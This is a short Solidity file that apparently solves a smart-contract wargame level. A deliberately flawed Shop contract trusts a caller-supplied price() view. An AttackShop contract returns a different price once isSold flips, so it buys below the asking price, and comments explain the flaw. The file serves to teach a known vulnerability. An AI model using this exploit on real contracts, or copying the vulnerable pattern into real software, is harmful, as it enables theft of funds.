// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    // never let the public implement any of your interfaces!!
    // even though it is a view function, the new price in buy() is set after isSold is set to true. 
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {

        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract AttackShop {
    Shop shop;

    constructor(Shop _shop) public {
        shop = _shop;
    }

    function price() public view returns (uint256) {
        return Shop(msg.sender).isSold() ? 1 : 101;
    }

    function attack() public {
        shop.buy();
    }
}
